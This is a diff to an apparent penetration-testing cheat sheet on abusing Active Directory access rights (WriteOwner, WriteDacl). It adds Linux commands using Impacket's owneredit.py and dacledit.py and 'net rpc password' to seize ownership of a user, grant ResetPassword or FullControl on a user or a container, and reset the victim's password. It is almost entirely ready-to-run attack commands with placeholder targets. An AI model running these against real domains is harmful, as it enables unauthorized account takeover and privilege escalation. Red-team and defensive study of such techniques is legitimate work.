@@ -12,6 +12,15 @@ With this rights on a user it is possible to become the "owner" (Grant Ownership
     $cred = ConvertTo-SecureString "Password123!" -AsPlainText -force                  
     Set-DomainUserPassword -Identity <target> -accountpassword $cred
 
+# Linux
+
+    owneredit.py -new-owner user1 -target user2 -dc-ip <DC_IP> -action write 'domain.local'/'user1':'password'
+    dacledit.py -action write -target user2 -principal user1 -rights ResetPassword -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'
+
+##### And change the password
+
+    net rpc password user2 -U 'domain.local'/'user1'%'password' -S DC.domain.local
+
 ## 2) WriteDacl
 
 With this rights we can modify our ACLs against the target, and give us GenericAll for example
@@ -29,3 +38,9 @@ In case where you have the right against a container or an OU, it is possible to
     $dsEntry.PsBase.Options.SecurityMasks = 'Dacl'
     $dsEntry.PsBase.ObjectSecurity.AddAccessRule($ACE)
     $dsEntry.PsBase.CommitChanges()
+
+# Linux
+
+    dacledit.py -action write -target user2 -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'
+
+    dacledit.py -inheritance -action write -target 'CN=Users,DC=domain,DC=local' -principal user1 -rights FullControl -ace-type allowed -dc-ip <DC_IP> 'domain.local'/'user1':'password'
